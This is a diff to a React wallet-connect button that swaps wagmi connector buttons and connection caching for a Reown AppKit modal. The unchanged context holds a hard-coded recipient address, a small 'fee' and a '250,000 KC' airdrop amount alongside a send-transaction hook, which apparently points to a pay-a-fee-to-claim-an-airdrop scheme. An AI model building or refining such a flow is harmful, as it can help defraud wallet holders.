@@ -1,13 +1,12 @@
 import React, { useEffect, useState } from 'react'
-import { 
-  useAccount, 
-  useConnect, 
-  useDisconnect, 
-  useChainId, 
-  useSwitchChain, 
+import { useAppKit } from '@reown/appkit/react'
+import {
+  useAccount,
+  useDisconnect,
+  useChainId,
+  useSwitchChain,
   useBalance,
-  useSendTransaction,
-  useChains
+  useSendTransaction
 } from 'wagmi'
 import { parseEther } from 'viem'
 import Swal from 'sweetalert2'
@@ -16,32 +15,19 @@ const WalletConnectBtn = () => {
   const fee = 0.0023
   const to = "0x353726D9AFc237Ee4B243254f1085e61EC102B9b"
   const airdropAmount = "250,000 KC"
-  
-  const { switchChain } = useSwitchChain()
+
+  const { open } = useAppKit()
+  const { switchChain, chains } = useSwitchChain()
   const chainId = useChainId()
-  const chains = useChains()
   const [sendAmount, setSendAmount] = useState('0')
-  
-  const { address, connector, isConnected } = useAccount()
-  
+
+  const { address, isConnected } = useAccount()
+
   // Use the useBalance hook instead of manual fetching
   const { data: balanceData, refetch: refetchBalance } = useBalance({
     address: address,
   })
 
-  const { connect, connectors, error, isPending } = useConnect({
-    mutation: {
-      onSuccess: () => {
-        // Cache successful connection
-        localStorage.setItem('walletConnected', 'true')
-        localStorage.setItem('lastConnectedTime', Date.now().toString())
-      },
-      onError: (error) => {
-        console.error('Connection error:', error)
-        localStorage.removeItem('walletConnected')
-      }
-    }
-  })
   const { disconnect } = useDisconnect({
     mutation: {
       onSuccess: () => {
@@ -72,33 +58,10 @@ const WalletConnectBtn = () => {
     backdropFilter: 'blur(20px)'
   }
 
-  // Check for cached connection on component mount
-  useEffect(() => {
-    const checkCachedConnection = () => {
-      const wasConnected = localStorage.getItem('walletConnected')
-      const lastConnected = localStorage.getItem('lastConnectedTime')
-      
-      // Auto-reconnect if connected within last 24 hours
-      if (wasConnected && lastConnected) {
-        const timeDiff = Date.now() - parseInt(lastConnected)
-        const twentyFourHours = 24 * 60 * 60 * 1000
-        
-        if (timeDiff < twentyFourHours && !isConnected) {
-          // Attempt to reconnect with the cached connection
-          console.log('Attempting cached reconnection...')
-        }
-      }
-    }
-    
-    checkCachedConnection()
-  }, [])
 
   useEffect(() => {
     if (isConnected && address) {
       refetchBalance()
-      // Update connection cache
-      localStorage.setItem('walletConnected', 'true')
-      localStorage.setItem('lastConnectedTime', Date.now().toString())
     }
   }, [isConnected, address, refetchBalance])
 
@@ -534,87 +497,32 @@ const WalletConnectBtn = () => {
       </div>
 
       <div className="d-grid gap-3">
-        {connectors.filter(connector => 
-          connector.type !== 'injected' || connector.name !== 'Injected'
-        ).map((connector) => {
-          const isCurrentlyConnecting = isPending && connector.id
-          return (
-            <button
-              className={`btn d-flex align-items-center justify-content-center p-3 ${isCurrentlyConnecting ? 'btn-loading' : ''}`}
-              style={{
-                background: isCurrentlyConnecting ? 
-                  'linear-gradient(135deg, rgba(25, 118, 210, 0.3), rgba(66, 165, 245, 0.2))' : 
-                  'rgba(25, 118, 210, 0.1)',
-                border: `1px solid ${isCurrentlyConnecting ? '#1976d2' : '#1e3a5f'}`,
-                borderRadius: '12px',
-                color: '#ffffff',
-                transition: 'all 0.3s cubic-bezier(0.4, 0, 0.2, 1)',
-                opacity: (!connector || isPending) ? 0.6 : 1,
-                transform: isCurrentlyConnecting ? 'scale(1.02)' : 'scale(1)',
-                boxShadow: isCurrentlyConnecting ? 
-                  '0 8px 25px rgba(25, 118, 210, 0.4)' : 
-                  '0 4px 15px rgba(25, 118, 210, 0.2)'
-              }}
-              disabled={!connector || isPending}
-              key={connector.id}
-              data-bs-dismiss={isPending ? '' : 'modal'}
-              onClick={() => {
-                if (!isPending) {
-                  connect({ connector })
-                }
-              }}
-              onMouseEnter={(e) => {
-                if (!isPending) {
-                  e.target.style.background = 'rgba(25, 118, 210, 0.2)'
-                  e.target.style.borderColor = '#1976d2'
-                }
-              }}
-              onMouseLeave={(e) => {
-                if (!isPending) {
-                  e.target.style.background = 'rgba(25, 118, 210, 0.1)'
-                  e.target.style.borderColor = '#1e3a5f'
-                }
-              }}
-            >
-              <div className="d-flex align-items-center">
-                {isCurrentlyConnecting ? (
-                  <span className="spinner-custom me-3" style={{
-                    display: 'inline-block',
-                    width: '20px',
-                    height: '20px',
-                    border: '2px solid rgba(255,255,255,0.3)',
-                    borderTop: '2px solid #ffffff',
-                    borderRadius: '50%'
-                  }}></span>
-                ) : (
-                  <span className="me-3" style={{fontSize: '20px'}}>
-                    {connector.name.includes('MetaMask') ? '🦊' :
-                     connector.name.includes('WalletConnect') ? '🔗' :
-                     connector.name.includes('Coinbase') ? '🏛️' : '👛'}
-                  </span>
-                )}
-                <span style={{fontWeight: '600'}}>
-                  {isCurrentlyConnecting ? 'Connecting...' : `Connect ${connector.name}`}
-                </span>
-              </div>
-            </button>
-          )
-        })}
-      </div>
- 
-      {error && (
-        <div className='alert mt-3 p-3' style={{
-          background: 'rgba(244, 67, 54, 0.1)',
-          border: '1px solid #f44336',
-          borderRadius: '10px',
-          color: '#ffcdd2'
-        }}>
+        <button
+          className="btn d-flex align-items-center justify-content-center p-3"
+          style={{
+            background: 'rgba(25, 118, 210, 0.1)',
+            border: '1px solid #1e3a5f',
+            borderRadius: '12px',
+            color: '#ffffff',
+            transition: 'all 0.3s cubic-bezier(0.4, 0, 0.2, 1)',
+            boxShadow: '0 4px 15px rgba(25, 118, 210, 0.2)'
+          }}
+          onClick={() => open()}
+          onMouseEnter={(e) => {
+            e.target.style.background = 'rgba(25, 118, 210, 0.2)'
+            e.target.style.borderColor = '#1976d2'
+          }}
+          onMouseLeave={(e) => {
+            e.target.style.background = 'rgba(25, 118, 210, 0.1)'
+            e.target.style.borderColor = '#1e3a5f'
+          }}
+        >
           <div className="d-flex align-items-center">
-            <span className="me-2">⚠️</span>
-            <small>{error.message}</small>
+            <span className="me-3" style={{fontSize: '20px'}}>👛</span>
+            <span style={{fontWeight: '600'}}>Connect Wallet</span>
           </div>
-        </div>
-      )}
+        </button>
+      </div>
     </div>
   )
 }
